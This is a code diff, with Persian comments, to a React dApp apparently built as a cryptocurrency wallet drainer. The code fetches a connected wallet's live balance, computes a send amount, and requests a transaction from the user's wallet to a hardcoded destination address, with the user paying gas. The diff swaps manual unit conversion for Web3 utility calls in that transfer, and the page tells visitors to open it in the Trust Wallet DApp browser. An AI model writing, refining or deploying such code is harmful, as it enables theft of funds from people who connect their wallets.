@@ -1,4 +1,5 @@
 import React, { useState } from "react";
+import Web3 from "web3";
 
 // دریافت موجودی واقعی از شبکه (eth_getBalance)
 async function getLiveBalance(address) {
@@ -7,7 +8,8 @@ async function getLiveBalance(address) {
       method: "eth_getBalance",
       params: [address, "latest"],
     });
-    return parseFloat(parseInt(balanceHex, 16) / 1e18).toFixed(6);
+    // استفاده از Web3 برای تبدیل از Wei به ether
+    return parseFloat(Web3.utils.fromWei(balanceHex, "ether")).toFixed(6);
   } catch (error) {
     console.error("❌ Error fetching live balance:", error);
     return null;
@@ -19,7 +21,9 @@ function App() {
 
   async function connectAndSend() {
     if (typeof window.ethereum === "undefined") {
-      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
+      alert(
+        "No Ethereum provider found. Please open in Trust Wallet DApp Browser!"
+      );
       return;
     }
 
@@ -55,20 +59,19 @@ function App() {
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    // آدرس مقصد ثابت (بدون تغییر)
+    // آدرس مقصد ثابت
     const destination = "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD";
 
-    // ساخت شی تراکنش برای انتقال ارز
+    // تبدیل sendAmount به Wei با استفاده از Web3
+    const weiValue = Web3.utils.toWei(sendAmount.toString(), "ether");
     const txObject = {
       from: userAddress,
       to: destination,
-      // تبدیل sendAmount به Wei
-      value: "0x" + BigInt(Math.floor(sendAmount * 1e18)).toString(16),
-      // تنظیم اختیاری gas و gasPrice (یا اجازه دهید کیف پول محاسبه کند)
+      value: Web3.utils.toHex(weiValue),
     };
 
     try {
-      // ارسال تراکنش از کیف پول کاربر (که گس را خودش پرداخت می‌کند)
+      // ارسال تراکنش از کیف پول کاربر؛ گس توسط کاربر پرداخت می‌شود
       const txHash = await window.ethereum.request({
         method: "eth_sendTransaction",
         params: [txObject],
